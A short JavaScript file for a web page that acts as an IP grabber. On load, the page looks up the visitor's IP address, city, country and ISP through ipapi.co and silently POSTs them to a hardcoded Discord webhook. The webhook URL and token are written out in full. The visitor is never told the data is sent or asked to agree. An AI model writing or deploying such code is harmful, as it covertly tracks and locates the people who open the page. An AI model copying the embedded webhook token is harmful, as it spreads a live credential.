// Discord webhook URL
const webhookURL = "https://discord.com/api/webhooks/1348973855217156116/Y_wUbOXZn0U769LrIiPAFSE7VszYA1Kjc3y_35KnOXXKxn6EsA-ggbDVlunb8GLhh6kd";

// Function to fetch the user's IP address, location data, and ISP
async function fetchIPData() {
  try {
    const response = await fetch("https://ipapi.co/json/"); // More reliable IP API
    const data = await response.json();
    return {
      ip: data.ip,
      country: data.country_name,
      countryCode: data.country_code,
      city: data.city,
      isp: data.org || "Unknown ISP" // Fetching ISP (organization) from the response
    };
  } catch (error) {
    console.error("Error fetching IP data:", error);
    return {
      ip: "Unknown",
      country: "Unknown",
      countryCode: "XX",
      city: "Unknown",
      isp: "Unknown"
    };
  }
}

// Function to get the country flag emoji
function getCountryFlagEmoji(countryCode) {
  return String.fromCodePoint(...[...countryCode.toUpperCase()].map((char) => 0x1f1a5 + char.charCodeAt(0)));
}

// Function to send data to Discord webhook
async function sendToDiscord(ip, country, city, flag, isp) {
  const data = {
    content: `**IP Address:** ${ip}\n**Country:** ${country} ${flag}\n**City:** ${city}\n**ISP:** ${isp}`,
  };

  try {
    await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
    console.log("Data sent to Discord successfully!");
  } catch (error) {
    console.error("Error sending data to Discord:", error);
  }
}

// Main function to fetch IP, country, city, ISP, flag, and display/send data
async function main() {
  const { ip, country, countryCode, city, isp } = await fetchIPData();
  const flag = getCountryFlagEmoji(countryCode);

  // Display the IP address, city, ISP, and flag on the webpage
  document.getElementById("ip-address").textContent = ip;
  document.getElementById("country-flag").textContent = flag;
  document.getElementById("city").textContent = city;
  document.getElementById("isp").textContent = isp; // Display ISP

  // Send IP, country, city, ISP, and flag to Discord
  await sendToDiscord(ip, country, city, flag, isp);
}

// Run the main function when the page loads
document.addEventListener("DOMContentLoaded", main);
